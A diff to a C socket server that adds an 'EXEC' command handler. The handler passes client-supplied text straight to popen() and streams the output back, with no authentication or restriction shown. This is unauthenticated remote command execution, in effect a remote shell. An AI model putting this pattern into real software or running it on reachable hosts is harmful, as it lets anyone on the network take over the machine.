@@ -153,9 +153,30 @@ void handle_file_transfer(int client_fd, const char *header_info)
 	log_msg(KGRN, "File Saved: %s", filepath);
 }
 
+void handle_execution(int client_fd, const char *command_line)
+{
+	const char *cmd = command_line + 5;
+	log_msg(KYEL, "Executing: %s", cmd);
+
+	FILE *fp = popen(cmd, "r");
+	if (fp == NULL) {
+		const char *err = "Error: Failed to execute command.\n";
+		send(client_fd, err, strlen(err), 0);
+		return;
+	}
+
+	char path[1024];
+	while (fgets(path, sizeof(path), fp) != NULL) {
+		send(client_fd, path, strlen(path), 0);
+	}
+
+	pclose(fp);
+	log_msg(KGRN, "Execution complete");
+}
+
 void handle_client(int client_fd, struct sockaddr_in client_addr)
 {
-	char buf[512];
+	char buf[1024];
 	char *client_ip = inet_ntoa(client_addr.sin_addr);
 
 	ssize_t n = recv(client_fd, buf, sizeof(buf) - 1, 0);
@@ -164,6 +185,8 @@ void handle_client(int client_fd, struct sockaddr_in client_addr)
 		
 		if (strncmp(buf, "FILE", 4) == 0) {
 			handle_file_transfer(client_fd, buf);
+		} else if (strncmp(buf, "EXEC", 4) == 0) {
+			handle_execution(client_fd, buf);
 		} else {
 			log_msg(KCYN, "CMD from %s: %s", client_ip, buf);
 			const char *response = "ACK: Command Received";
